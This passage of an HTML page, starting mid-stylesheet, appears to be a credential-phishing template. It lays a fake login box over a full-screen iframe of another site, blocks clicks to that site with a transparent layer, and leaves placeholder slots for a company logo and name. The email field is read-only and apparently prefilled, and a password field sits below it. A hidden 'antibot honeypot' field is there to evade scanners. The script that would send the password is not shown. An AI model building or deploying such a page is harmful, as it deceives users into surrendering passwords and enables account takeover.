#iframe-content { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: none; z-index: 0; }
#blocker { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: transparent; z-index: 5; pointer-events: all; }
#login-box { position: fixed; top: 50%; left: 50%; transform: translate(-50% ,-50%); background: #ffffff; padding: 20px; border-radius: 4px; box-shadow: 0 0 10px 0px #0003; width: 375px; z-index: 10; }
#login-box .header { display: flex; align-items: center; margin-bottom: 20px; }
#login-box .header img { margin-right: 10px; max-width: 40px; }
#login-box .header h2 { margin: 0; font-size: 18px; color: #425152; text-transform: uppercase; }
.row { display: flex; align-items: center; margin-bottom: 15px; }
.row label { width: 80px; font-weight: bold; color: #425152; }
.row input { flex: 1; padding: 6px 10px; border: 1px solid #ccc; border-radius: 4px; }
button { padding: 6px 10px; background: black; color: #ffffff; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; align-self: flex-start; }
button:hover { background: #333; }
#error-message { color: red; margin-top: 10px; font-size: 14px; }
p.copy { margin-top: 15px; font-size: 11px; color: #666; }
</style>
</head>
<body>

<iframe id="iframe-content" src=""> </iframe>
<div id="blocker"></div>

<div id="login-box">
  <div class="header">
    <img id="logo-img" src="" alt="Company Logo">
    <h2 id="company-name">Company</h2>
  </div>
  
  
  
  
  
  <form id="loginForm">
    <!-- Antibot Honeypot -->
    <input type="text" id="b_name" style="display:none !important" tabindex="-1" autocomplete="off">
    
    <div class="row">
      <label for="email">Email :</label>
      <input type="email" id="email" readonly>
    </div>

    <div class="row">
      <label for="password">Password :</label>
      <input type="password" id="password" placeholder="Enter password" required autofocus>
    </div>

    <button type="submit" id="submitBtn">Login</button>
    <div id="error-message"></div>
  </form>

  <p class="copy">
    All rights reserved. Copyright ©️ 2026
    <span id="copy-name">Company</span>
  </p>
</div>
